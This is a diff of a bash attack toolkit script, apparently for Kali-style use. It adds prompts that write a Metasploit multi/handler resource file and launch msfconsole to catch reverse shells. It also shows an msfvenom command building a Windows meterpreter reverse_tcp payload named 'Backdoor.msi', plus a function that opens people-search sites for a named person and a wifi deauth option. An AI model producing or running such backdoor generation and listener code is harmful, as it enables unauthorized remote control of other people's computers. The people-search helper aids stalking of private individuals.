@@ -1,6 +1,4 @@
 #!/bin/bash
-#
-# Author: Lukebob
 
 ipadd=$(ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1  -d'/')
 port=$(shuf -i 2000-65000 -n 1)
@@ -47,7 +45,8 @@ fi
 
 
 connct(){
-
+firefox &
+sleep 7
 firefox http://www.411.com/name/$fname-$lname/ &
 sleep 1
 firefox http://www.cvgadget.com/person/$fname/$lname &
@@ -102,8 +101,8 @@ boost(){
     echo
     echo
     echo " ############## "
-    echo " #     Wifi   # "
-    echo " #    BOOSTA  # "
+    echo " # Wifi       # "
+    echo " #    BOOSTAH # "
     echo " ############## "
     echo
     echo
@@ -248,7 +247,35 @@ exe(){
   echo
   echo "Listner set to port $port1"
   echo
-
+  echo -n "Would you like to launch metasploit with the listner?: "
+  read list
+  case $list in
+        y)
+      echo
+      sleep 1 ; clear 
+      echo "Starting Metasploit Listner..."
+      touch Listner.rc
+      echo "use exploit/multi/handler" >> Listner.rc
+      echo "set LHOST $ipadd" >> Listner.rc
+      echo "set LPORT $port1" >> Listner.rc
+      echo "exploit -j" >> Listner.rc
+      sleep 1
+      echo
+      service postgresql restart &&
+      msfdb init >>/dev/null &&
+      gnome-terminal -e "msfconsole -r ./Listner.rc" & 
+        ;;
+        n)
+      sleep 1 
+      clear
+      echo
+      echo "Metasploit Not started!!"
+      exit
+        ;;
+        *)
+      echo
+      echo "(y/n)"
+  esac
 }
 
 elf(){
@@ -258,12 +285,70 @@ elf(){
   echo
   echo "Listner set to port $port1"
   echo
-
+  echo -n "Would you like to launch metasploit with the listner?: "
+  read list1
+  case $list1 in
+        y)
+      echo 
+      echo "Starting Metasploit Listner..."
+      touch Listner.rc
+      echo "use exploit/multi/handler" >> Listner.rc
+      echo "set LHOST $ipadd" >> Listner.rc
+      echo "set LPORT $port1" >> Listner.rc
+      echo "exploit -j" >> Listner.rc
+      sleep 1
+      service postgresql restart &&
+      msfdb init >>/dev/null &&
+      gnome-terminal -e "msfconsole -r ./Listner.rc" & 
+        ;;
+        n)
+      echo
+      sleep 1
+      clear
+      echo "Metasploit Not started!!"
+      exit
+        ;;
+        *)
+      echo
+      echo "(y/n)"
+  esac
 }
 
 
 msi(){
   msfvenom -p windows/meterpreter/reverse_tcp -f msi -b '\x00\xff' lhost=$ipadd lport=$port1 -o ~/Desktop/Backdoor.msi >>/dev/null
+  echo
+  echo "Payload Generated.. On your Desktop.."
+  sleep 1
+  echo
+  echo
+  echo -n "Would you like to launch metasploit with the listner?: "
+  read list2
+  case $list2 in
+        y)
+      echo 
+      echo "Starting Metasploit Listner..."
+      touch Listner.rc
+      echo "use exploit/multi/handler" >> Listner.rc
+      echo "set LHOST $ipadd" >> Listner.rc
+      echo "set LPORT $port1" >> Listner.rc
+      echo "exploit -j" >> Listner.rc
+      sleep 1
+      service postgresql restart &&
+      msfdb init >>/dev/null &&
+      gnome-terminal -e "msfconsole -r ./Listner.rc" & 
+        ;;
+        n)
+      echo
+      sleep 1
+      clear
+      echo "Metasploit Not started!!"
+      exit
+        ;;
+        *)
+      echo
+      echo "(y/n)"
+  esac
 }
 
 function deauth {
@@ -319,13 +404,20 @@ restore(){
 
 case $1 in
   exe)
-  exe
+  exe &&
+  sleep 15
+  rm Listner.rc >>/dev/null
   ;;
   elf)
-  elf
+  elf &&
+  sleep 15
+  rm Listner.rc >>/dev/null
+  
   ;;
   msi)
-  msi
+  msi && 
+  sleep 15
+  rm Listner.rc >>/dev/null
   ;;
   deauth)
   deauth
